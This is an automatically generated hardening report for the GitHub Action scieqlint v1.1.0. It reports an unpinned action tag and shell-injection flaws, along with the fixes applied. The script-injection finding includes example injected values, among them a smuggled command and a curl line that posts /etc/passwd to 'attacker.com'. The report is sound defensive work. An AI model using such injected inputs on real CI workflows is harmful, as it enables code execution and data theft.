<!-- markdownlint-disable -->

# Hardening Report: 1sgtpepper--scieqlint/v1.1.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **1sgtpepper--scieqlint/v1.1.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The action uses `actions/setup-python@v6` which is pinned to a mutable tag (`v6`) rather than an immutable 40-character commit SHA. This is vulnerable to supply-chain attacks if the tag is moved to point to a different (potentially malicious) commit.

Locations:

- `action.yml:22`

### script-injection (severity: high)

Sub-rule (a): Two `run:` blocks directly interpolate `${{ inputs.* }}` expressions into shell command strings without routing through `env:` variables. (1) Line 27: `python -m pip install "scieqlint==${{ inputs.package-version }}"` — the package-version input is interpolated directly into the shell command, allowing an attacker to inject shell metacharacters (e.g. `1.0.0" && malicious-command #`). (2) Line 30: `scieqlint ${{ inputs.args }}` — the args input is interpolated directly and completely unquoted, allowing arbitrary shell command injection (e.g. `check . && curl -d @/etc/passwd attacker.com`). Both inputs should be moved to `env:` variables and then referenced as quoted shell variables (e.g. `"$ARGS"`) in the `run:` block.

Locations:

- `action.yml:27`
- `action.yml:30`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.package-version }}" appears directly in run: block of step "Install SciEqLint"; move to env: map

Locations:

- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step "Run SciEqLint"; move to env: map

Locations:

- `action.yml:31`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed three categories of findings in hardened/action/action.yml: (1) Pinned actions/setup-python@v6 to its full commit SHA ece7cb06caefa5fff74198d8649806c4678c61a1 with the tag preserved as a comment. (2) Moved ${{ inputs.package-version }} into an env: variable (PACKAGE_VERSION) and referenced it as $PACKAGE_VERSION in the pip install command. (3) Moved ${{ inputs.args }} into an env: variable (INPUT_ARGS) and used the xargs-based array tokenization pattern to safely split the argument list into separate shell words, preventing injection while correctly handling quoted arguments like 'check .'.

